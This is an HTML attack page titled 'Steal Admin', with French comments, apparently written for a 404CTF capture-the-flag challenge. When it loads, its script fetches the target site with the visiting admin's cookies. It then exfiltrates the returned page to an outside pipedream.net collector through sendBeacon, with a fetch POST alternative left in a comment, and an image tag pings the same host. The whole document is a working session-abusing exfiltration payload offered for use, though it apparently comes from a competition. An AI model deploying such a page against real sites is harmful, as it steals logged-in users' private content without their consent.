<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <title>Steal Admin</title>
  </head>
  <body>
    <h1>Contenu volé :</h1>
    <pre id="out">en attente…</pre>

    <!-- confirmation de rendu -->
    <img src="https://eoyi24wnc60zgb.m.pipedream.net?test=1" alt="" />

    <script>
      (async () => {
        // 1) Récupère la home du challenge AVEC le cookie admin
        const resp = await fetch("https://spacefleetcommand.404ctf.fr/", {
          credentials: "include",
        });
        const html = await resp.text();

        // 2) Affiche local pour vérif
        document.getElementById("out").textContent = html;

        // 3) Exfiltration fiable en POST :
        //    sendBeacon autorise les gros payloads même en mode no-cors
        const blob = new Blob([html], { type: "text/plain" });
        navigator.sendBeacon(
          "https://eoyi24wnc60zgb.m.pipedream.net/collect",
          blob
        );

        // — ou, si tu préfères fetch :
        /*
    fetch("https://eoyi24wnc60zgb.m.pipedream.net/collect", {
      method: "POST",
      mode:   "no-cors",
      body:   html
    });
    */
      })();
    </script>
  </body>
</html>
